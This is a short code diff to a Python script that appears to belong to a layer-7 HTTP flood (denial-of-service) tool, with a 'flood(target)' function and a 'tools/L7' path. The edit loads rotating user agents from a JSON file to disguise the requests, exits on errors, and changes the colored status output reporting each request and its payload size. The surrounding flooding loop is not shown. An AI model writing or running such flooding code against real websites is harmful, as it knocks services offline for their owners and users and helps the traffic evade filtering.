@@ -1,16 +1,13 @@
+import json
 import random
+import sys
 
 import requests
 from colorama import Fore
 
-import tools.randomData as randomData
-
 # Loads user agents
-user_agents = []
-while len(user_agents) < 30:
-    user_agent = randomData.random_useragent()
-    if not user_agent in user_agents:
-        user_agents.append(user_agent)
+with open("tools/L7/user_agents.json", "r") as agents:
+    user_agents = json.load(agents)["agents"]
 
 # Headers
 headers = {
@@ -30,9 +27,8 @@ def flood(target):
     except requests.exceptions.ConnectTimeout:
         print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out!{Fore.RESET}")
     except Exception as e:
-        print(
-            f"{Fore.MAGENTA}Error sending GET requests!\n{Fore.MAGENTA}{e}{Fore.RESET}"
-        )
+        print(f"{Fore.RED}Error sending GET requests!\n\n{Fore.MAGENTA}{e}{Fore.RESET}")
+        sys.exit(1)
     else:
         print(
             f"{Fore.GREEN}[{r.status_code}] {Fore.CYAN}Request sending! Payload Size: {len(payload)}.{Fore.RESET}"
